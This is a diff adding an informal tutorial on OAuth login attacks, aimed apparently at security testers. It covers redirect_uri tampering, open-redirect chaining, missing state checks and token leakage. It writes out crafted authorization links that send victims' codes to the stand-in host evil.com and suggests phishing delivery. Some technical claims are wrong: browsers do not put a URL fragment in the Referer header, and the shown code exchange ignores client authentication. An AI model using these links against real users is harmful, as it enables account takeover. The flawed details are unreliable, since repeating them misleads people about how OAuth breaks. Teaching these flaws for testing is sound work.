@@ -1,0 +1,187 @@
+First: What OAuth Login Actually Does (Simple)
+When you click:
+
+👉 “Login with Google”
+
+Behind the scenes:
+Website sends you to Google:
+
+https://accounts.google.com/o/oauth2/auth?
+ client_id=APP123
+ &redirect_uri=https://victim.com/callback
+
+You login on Google
+
+Google sends you back:
+https://victim.com/callback?code=ABC123
+Website uses this code to log you in
+
+👉 IMPORTANT:
+That code=ABC123 is like a temporary password
+
+If attacker gets it → they can login as you
+
+🚨 NOW THE REAL ATTACK (STEP BY STEP)
+
+
+🔥 Attack 1: Redirect URI Manipulation (MAIN ATTACK)
+🎯 Goal:
+Make OAuth send the code to attacker instead of victim site
+👨‍💻 Step 1: Attacker Finds OAuth URL
+Attacker goes to login page → clicks "Login with Google"
+Captures request using Burp Suite
+
+He sees something like:
+https://accounts.google.com/o/oauth2/auth?
+ client_id=APP123
+ &redirect_uri=https://victim.com/callback
+ &response_type=code
+   
+🧪 Step 2: Attacker Tests Injection
+He changes:
+redirect_uri=https://evil.com
+Sends request
+
+❌ If secure:
+Server rejects → attack fails
+
+✅ If vulnerable:
+Server accepts → BIG PROBLEM
+
+💣 Step 3: Create Malicious Link
+Attacker creates:
+
+https://accounts.google.com/o/oauth2/auth?
+ client_id=APP123
+ &redirect_uri=https://evil.com
+ &response_type=code
+   
+🎯 Step 4: Send to Victim
+Attacker sends link via:
+
+phishing email
+chat message
+fake login page
+
+👤 Step 5: Victim Clicks Link
+Victim sees:
+👉 Google login page (looks legit)
+Victim logs in
+
+💥 Step 6: Google Redirects
+Instead of going to victim site:
+https://evil.com?code=VICTIM_CODE
+👉 Attacker server receives this
+
+🧠 Step 7: Attacker Uses Code
+
+Attacker now sends this to victim app:
+
+POST /token
+code=VICTIM_CODE
+
+👉 Gets access token → logs in as victim
+
+🔥 THIS IS FULL ACCOUNT TAKEOVER
+❗ YOUR MAIN CONFUSION (IMPORTANT)
+❓ “How attacker inject URL?”
+👉 Attacker does NOT inject into server
+
+👉 He simply:
+Takes original OAuth URL
+Modifies parameters manually
+Sends that link to victim
+💡 Think like this:
+
+OAuth URL = just a normal URL
+Anyone can change it like:
+https://example.com?param=value
+👉 Attacker edits param=value
+
+🔥 Attack 2: Open Redirect Chaining (VERY REALISTIC)
+🎯 Situation:
+
+Server only allows:
+
+redirect_uri=https://victim.com/*
+🧪 Attacker Finds Open Redirect
+
+Example:
+https://victim.com/redirect?url=ANYTHING
+
+💣 Exploit
+Attacker uses:
+redirect_uri=https://victim.com/redirect?url=https://evil.com
+  
+🔁 Flow:
+Victim logs in
+Redirect to:
+victim.com/redirect?url=https://evil.com&code=XYZ
+victim.com redirects again:
+https://evil.com?code=XYZ
+
+👉 Attacker still gets code 😈
+
+🔥 Attack 3: Missing State (CSRF)
+🎯 Goal:
+Force victim to login into attacker account
+
+💣 Steps:
+Step 1: Attacker logs in normally
+Gets:
+https://victim.com/callback?code=ATTACKER_CODE
+Step 2: Attacker sends this link to victim
+Step 3: Victim clicks
+
+If no state check:
+
+👉 victim gets logged into attacker account
+
+🔥 Impact:
+Data confusion
+Session hijack
+Account linking abuse
+🔥 Attack 4: Token Leakage
+🎯 Problem:
+
+Token is in URL:
+https://victim.com/callback#access_token=ABC123
+💣 Attack:
+Page loads:
+<img src="https://evil.com/log">
+Browser sends:
+Referer: https://victim.com/callback#access_token=ABC123
+
+👉 Token leaked
+
+🧠 REAL HACKER MINDSET
+
+When you test OAuth:
+
+✔️ Step-by-step checklist
+1. Capture OAuth request (Burp)
+2. Modify:
+redirect_uri
+state
+response_type
+3. Try:
+your domain
+open redirect
+encoded payload
+4. Observe:
+where code goes
+is state validated?
+is token exposed?
+🔥 SIMPLE ANALOGY (BEST WAY TO UNDERSTAND)
+
+Think:
+
+OAuth = courier delivering parcel (code)
+redirect_uri = delivery address
+👉 Attacker changes address:
+Instead of:
+Deliver to: victim.com
+he writes:
+Deliver to: evil.com
+
+👉 Courier (OAuth server) delivers to attacker 😈
